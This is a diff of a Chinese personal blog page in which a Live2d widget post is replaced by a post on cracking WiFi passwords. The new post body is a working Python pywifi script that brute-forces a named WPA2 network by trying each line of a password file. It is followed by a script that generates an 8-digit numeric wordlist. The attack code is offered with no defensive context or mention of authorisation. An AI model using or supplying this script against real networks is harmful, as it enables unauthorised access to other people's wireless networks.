@@ -10,7 +10,7 @@
     
     
     
-    <title>Live2d | 白筱の猫舍</title>
+    <title>Python Wifi 破解以及生成密码库‘’“ | 白筱の猫舍</title>
     <link href="https://WhiteXB.github.io" rel="prefetch" />
 
     
@@ -207,26 +207,19 @@
         <i class="fa fa-home"></i>
         <a href="https://WhiteXB.github.io">白筱の猫舍</a>
         >
-        <span>Live2d</span>
+        <span>Python Wifi 破解以及生成密码库‘’“</span>
     </div>
     <!-- 大型设备详细文章 -->
     <div class="hidden-xs">
         <div class="title-article">
             <h1>
-                <a href="">Live2d</a>
+                <a href="">Python Wifi 破解以及生成密码库‘’“</a>
             </h1>
         </div>
         <div class="tag-article">
             
             <span class="label label-gal">
-                <i class="fa fa-tags"></i>
-                
-                <a href="../../../../tags/hexo%E6%90%AD%E5%BB%BA/">hexo搭建</a>
-                
-            </span>
-            
-            <span class="label label-gal">
-                <i class="fa fa-calendar"></i> 2021-03-23
+                <i class="fa fa-calendar"></i> 2021-07-10
             </span>
             
         </div>
@@ -236,45 +229,103 @@
         <center>
             <div class="title-article">
                 <h4>
-                    <a href="">Live2d</a>
+                    <a href="">Python Wifi 破解以及生成密码库‘’“</a>
                 </h4>
             </div>
             <p>
-                <i class="fa fa-calendar"></i> 2021-03-23
+                <i class="fa fa-calendar"></i> 2021-07-10
             </p>
             <p>
-                
-                <i class="fa fa-tags"></i>
-                
-                <a href="../../../../tags/hexo%E6%90%AD%E5%BB%BA/">hexo搭建</a>
-                
                 
                 
             </p>
         </center>
     </div>
     <div class="content-article">
-        <p>成功配置看板娘<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1QW411w7Da?t=40">https://www.bilibili.com/video/BV1QW411w7Da?t=40</a></p>
+        <h1 id="安装python依赖库-pywifi"><a href="#安装python依赖库-pywifi" class="headerlink" title="安装python依赖库 pywifi"></a>安装python依赖库 pywifi</h1><p>#coding:utf-8<br>import pywifi<br>from pywifi import const<br>import time<br>import datetime</p>
+<h1 id="破解代码"><a href="#破解代码" class="headerlink" title="破解代码"></a>破解代码</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#测试连接，返回链接结果</span>
+def wifiConnect<span class="token punctuation">(</span>pwd<span class="token punctuation">)</span>:
+    <span class="token comment">#抓取网卡接口</span>
+    <span class="token assign-left variable">wifi</span><span class="token operator">=</span>pywifi.PyWiFi<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token comment">#获取第一个无线网卡</span>
+    <span class="token assign-left variable">ifaces</span><span class="token operator">=</span>wifi.interfaces<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+    <span class="token comment">#断开所有连接</span>
+    ifaces.disconnect<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    time.sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token assign-left variable">wifistatus</span><span class="token operator">=</span>ifaces.status<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> wifistatus <span class="token operator">==</span>const.IFACE_DISCONNECTED:
+        <span class="token comment">#创建WiFi连接文件</span>
+        <span class="token assign-left variable">profile</span><span class="token operator">=</span>pywifi.Profile<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token comment">#要连接WiFi的名称</span>
+        profile.ssid<span class="token operator">=</span><span class="token string">"360zc"</span>
+        <span class="token comment">#网卡的开放状态</span>
+        profile.auth<span class="token operator">=</span>const.AUTH_ALG_OPEN
+        <span class="token comment">#wifi加密算法,一般wifi加密算法为wps</span>
+        profile.akm.append<span class="token punctuation">(</span>const.AKM_TYPE_WPA2PSK<span class="token punctuation">)</span>
+        <span class="token comment">#加密单元</span>
+        profile.cipher<span class="token operator">=</span>const.CIPHER_TYPE_CCMP
+        <span class="token comment">#调用密码</span>
+        profile.key<span class="token operator">=</span>pwd
+        <span class="token comment">#删除所有连接过的wifi文件</span>
+        ifaces.remove_all_network_profiles<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token comment">#设定新的连接文件</span>
+        <span class="token assign-left variable">tep_profile</span><span class="token operator">=</span>ifaces.add_network_profile<span class="token punctuation">(</span>profile<span class="token punctuation">)</span>
+        ifaces.connect<span class="token punctuation">(</span>tep_profile<span class="token punctuation">)</span>
+        <span class="token comment">#wifi连接时间</span>
+        time.sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> ifaces.status<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>const.IFACE_CONNECTED:
+            <span class="token builtin class-name">return</span> True
+        else:
+            <span class="token builtin class-name">return</span> False
+    else:
+        print<span class="token punctuation">(</span><span class="token string">"已有wifi连接"</span><span class="token punctuation">)</span> 
+<span class="token comment">#读取密码本</span>
+def readPassword<span class="token punctuation">(</span><span class="token punctuation">)</span>:
+    print<span class="token punctuation">(</span><span class="token string">"开始破解:"</span><span class="token punctuation">)</span>
+    <span class="token comment">#密码本路径</span>
+    <span class="token assign-left variable">path</span><span class="token operator">=</span><span class="token string">"D:\个人文档\学习资料\网络攻防\wifi\password.txt"</span>
+    <span class="token comment">#打开文件</span>
+    <span class="token assign-left variable">file</span><span class="token operator">=</span>open<span class="token punctuation">(</span>path,<span class="token string">"r"</span><span class="token punctuation">)</span>
+    <span class="token keyword">while</span> True:
+        try:
+            <span class="token comment">#一行一行读取</span>
+            <span class="token assign-left variable">pad</span><span class="token operator">=</span>file.readline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token assign-left variable">bool</span><span class="token operator">=</span>wifiConnect<span class="token punctuation">(</span>pad<span class="token punctuation">)</span>
+            
+            <span class="token keyword">if</span> bool:
+                print<span class="token punctuation">(</span><span class="token string">"密码已破解： "</span>,pad<span class="token punctuation">)</span>
+                print<span class="token punctuation">(</span><span class="token string">"WiFi已自动连接！！！"</span><span class="token punctuation">)</span>
+                <span class="token builtin class-name">break</span>
+            else:
+                <span class="token comment">#跳出当前循环，进行下一次循环</span>
+                print<span class="token punctuation">(</span><span class="token string">"密码破解中....密码校对: "</span>,pad<span class="token punctuation">)</span>
+        except:
+            <span class="token builtin class-name">continue</span>
+ 
+<span class="token assign-left variable">start</span><span class="token operator">=</span>datetime.datetime.now<span class="token punctuation">(</span><span class="token punctuation">)</span> 
+readPassword<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token assign-left variable">end</span><span class="token operator">=</span>datetime.datetime.now<span class="token punctuation">(</span><span class="token punctuation">)</span>
+print<span class="token punctuation">(</span><span class="token string">"破解WIFI密码一共用了多长时间：&#123;&#125;"</span>.format<span class="token punctuation">(</span>end-start<span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="生成密码库"><a href="#生成密码库" class="headerlink" title="生成密码库"></a>生成密码库</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">import</span> itertools as its
+<span class="token function">import</span> datetime
+ 
+<span class="token comment">#记录程序运行时间</span>
+<span class="token assign-left variable">start</span><span class="token operator">=</span>datetime.datetime.now<span class="token punctuation">(</span><span class="token punctuation">)</span>
+words <span class="token operator">=</span> <span class="token string">'1234567890'</span><span class="token comment">#这里可以加入字母和其他字符，使用string包更方便</span>
+<span class="token comment">#生成密码的位数</span>
+r <span class="token operator">=</span> its.product<span class="token punctuation">(</span>words,repeat<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment">#4即生成4位密码，正常情况下热点密码位数为8</span>
+dic <span class="token operator">=</span>open<span class="token punctuation">(</span>r<span class="token string">"D:\个人文档\学习资料\网络攻防\wifi\paswwer.txt"</span>,<span class="token string">'a'</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> r:
+    dic.write<span class="token punctuation">(</span><span class="token string">''</span>.join<span class="token punctuation">(</span>i<span class="token punctuation">))</span>
+    dic.write<span class="token punctuation">(</span><span class="token string">''</span>.join<span class="token punctuation">(</span><span class="token string">'<span class="token entity" title="\n">\n</span>'</span><span class="token punctuation">))</span>
+    print<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+ 
+dic.close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+print<span class="token punctuation">(</span><span class="token string">'密码本生成好了'</span><span class="token punctuation">)</span>
+<span class="token assign-left variable">end</span><span class="token operator">=</span>datetime.datetime.now<span class="token punctuation">(</span><span class="token punctuation">)</span>
+print<span class="token punctuation">(</span><span class="token string">"生成密码本一共用了多长时间：&#123;&#125;"</span>.format<span class="token punctuation">(</span>end-start<span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="适用于重英文的wifi名"><a href="#适用于重英文的wifi名" class="headerlink" title="适用于重英文的wifi名"></a>适用于重英文的wifi名</h1><p>更高级的破解wifi 使用kail和无线网卡<br>未完待续</p>
 
-<link rel="stylesheet" href="/live2d/css/live2d.css">
-
-<body>
-<div id="landlord">
-    <div class="message" style="opacity:0"></div>
-    <canvas id="live2d" width="280" height="250" class="live2d"></canvas>
-    <div class="hide-button">隐藏</div>
-</div>
-<script type="text/javascript" src="https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
-<script type="text/javascript">
-    var message_Path = '/live2d/'
-    var home_Path = 'https://white-x.top'
-</script>
-<script type="text/javascript" src="/live2d/js/live2d.js"></script>
-<script type="text/javascript" src="/live2d/js/message.js"></script>
-<script type="text/javascript">
-    loadlive2d("live2d", "/live2d/model/tia/model.json");
-</script>
-</body>
     </div>
 </article>
 
@@ -284,7 +335,7 @@
 <script>
 	if(!window.commentConfig) {
       window.commentConfig = {}
-      window.commentConfig.title = 'Live2d'
+      window.commentConfig.title = 'Python Wifi 破解以及生成密码库‘’“'
     }
 </script>
 
@@ -344,49 +395,49 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="../../../07/10/python-wifi-%E7%A0%B4%E8%A7%A3%E4%BB%A5%E5%8F%8A%E7%94%9F%E6%88%90%E5%AF%86%E7%A0%81%E5%BA%93%E2%80%98%E2%80%99%E2%80%9C/">Python Wifi 破解以及生成密码库‘’“</a>
+                    <a href="">Python Wifi 破解以及生成密码库‘’“</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="../../../07/10/linux-%E5%9F%BA%E7%A1%80/">Linux 基础</a>
+                    <a href="../linux-%E5%9F%BA%E7%A1%80/">Linux 基础</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="../../26/%E5%85%B3%E4%BA%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD%E5%92%8C%E5%85%B3%E7%B3%BB%E5%AE%9A%E4%B9%89/">关于数据库的专业术语和关系定义</a>
+                    <a href="../../../03/26/%E5%85%B3%E4%BA%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD%E5%92%8C%E5%85%B3%E7%B3%BB%E5%AE%9A%E4%B9%89/">关于数据库的专业术语和关系定义</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="../../25/Hexo%E4%BD%BF%E7%94%A8%E6%94%BB%E7%95%A5-%E6%B7%BB%E5%8A%A0%E5%88%86%E7%B1%BB%E5%8F%8A%E6%A0%87%E7%AD%BE/">Hexo使用攻略-添加分类及标签</a>
+                    <a href="../../../03/25/Hexo%E4%BD%BF%E7%94%A8%E6%94%BB%E7%95%A5-%E6%B7%BB%E5%8A%A0%E5%88%86%E7%B1%BB%E5%8F%8A%E6%A0%87%E7%AD%BE/">Hexo使用攻略-添加分类及标签</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="../../24/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%B8%89%E7%BA%A7%E6%A8%A1%E5%BC%8F%E7%BB%93%E6%9E%84/">数据库的三级模式结构</a>
+                    <a href="../../../03/24/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%B8%89%E7%BA%A7%E6%A8%A1%E5%BC%8F%E7%BB%93%E6%9E%84/">数据库的三级模式结构</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="">Live2d</a>
+                    <a href="../../../03/23/live2d/">Live2d</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="../../22/%E5%85%B3%E4%BA%8E%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2/">关于进制转换</a>
+                    <a href="../../../03/22/%E5%85%B3%E4%BA%8E%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2/">关于进制转换</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="../../21/hello-world/">有关建站</a>
+                    <a href="../../../03/21/hello-world/">有关建站</a>
                 </span>
             </li>
             
@@ -408,49 +459,49 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="../../25/Hexo%E4%BD%BF%E7%94%A8%E6%94%BB%E7%95%A5-%E6%B7%BB%E5%8A%A0%E5%88%86%E7%B1%BB%E5%8F%8A%E6%A0%87%E7%AD%BE/">Hexo使用攻略-添加分类及标签</a>
+                    <a href="../../../03/25/Hexo%E4%BD%BF%E7%94%A8%E6%94%BB%E7%95%A5-%E6%B7%BB%E5%8A%A0%E5%88%86%E7%B1%BB%E5%8F%8A%E6%A0%87%E7%AD%BE/">Hexo使用攻略-添加分类及标签</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="">Live2d</a>
+                    <a href="../../../03/23/live2d/">Live2d</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="../../21/hello-world/">有关建站</a>
+                    <a href="../../../03/21/hello-world/">有关建站</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="../../26/%E5%85%B3%E4%BA%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD%E5%92%8C%E5%85%B3%E7%B3%BB%E5%AE%9A%E4%B9%89/">关于数据库的专业术语和关系定义</a>
+                    <a href="../../../03/26/%E5%85%B3%E4%BA%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD%E5%92%8C%E5%85%B3%E7%B3%BB%E5%AE%9A%E4%B9%89/">关于数据库的专业术语和关系定义</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="../../22/%E5%85%B3%E4%BA%8E%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2/">关于进制转换</a>
+                    <a href="../../../03/22/%E5%85%B3%E4%BA%8E%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2/">关于进制转换</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="../../24/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%B8%89%E7%BA%A7%E6%A8%A1%E5%BC%8F%E7%BB%93%E6%9E%84/">数据库的三级模式结构</a>
+                    <a href="../../../03/24/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%B8%89%E7%BA%A7%E6%A8%A1%E5%BC%8F%E7%BB%93%E6%9E%84/">数据库的三级模式结构</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="../../../07/10/linux-%E5%9F%BA%E7%A1%80/">Linux 基础</a>
+                    <a href="../linux-%E5%9F%BA%E7%A1%80/">Linux 基础</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="../../../07/10/python-wifi-%E7%A0%B4%E8%A7%A3%E4%BB%A5%E5%8F%8A%E7%94%9F%E6%88%90%E5%AF%86%E7%A0%81%E5%BA%93%E2%80%98%E2%80%99%E2%80%9C/">Python Wifi 破解以及生成密码库‘’“</a>
+                    <a href="">Python Wifi 破解以及生成密码库‘’“</a>
                 </span>
             </li>
             
@@ -483,11 +534,11 @@
                 
                 <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
     
-    <a href="../../../../tags/hexo%E6%90%AD%E5%BB%BA/" style="font-size: 10.816315025136223px;" class="tag-cloud-link">hexo搭建</a>
+    <a href="../../../../tags/hexo%E6%90%AD%E5%BB%BA/" style="font-size: 16.406136366092614px;" class="tag-cloud-link">hexo搭建</a>
     
-    <a href="../../../../tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 8.801940884447568px;" class="tag-cloud-link">数据库</a>
+    <a href="../../../../tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 18.05245374309938px;" class="tag-cloud-link">数据库</a>
     
-    <a href="../../../../tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" style="font-size: 10.155045514708531px;" class="tag-cloud-link">计算机基础</a>
+    <a href="../../../../tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" style="font-size: 12.598648111747718px;" class="tag-cloud-link">计算机基础</a>
     
 </div>
                 
@@ -603,7 +654,7 @@
 <script src="https://myau.moe/js/comment/gitment.browser.js"></script>
 <script>
     if(window.commentConfig) {
-      window.commentConfig.id = 'Tue Mar 23 2021 21:51:26 GMT+0800'
+      window.commentConfig.id = 'Sat Jul 10 2021 18:10:11 GMT+0800'
       window.commentConfig.owner = ''
       window.commentConfig.repo = ''
       window.commentConfig.client_id = ''
@@ -611,7 +662,7 @@
       window.commentConfig.redirect_uri = ''
     } else {
       window.commentConfig = {
-      	id: 'Tue Mar 23 2021 21:51:26 GMT+0800',
+      	id: 'Sat Jul 10 2021 18:10:11 GMT+0800',
         owner: '',
         repo: '',
         client_id: '',
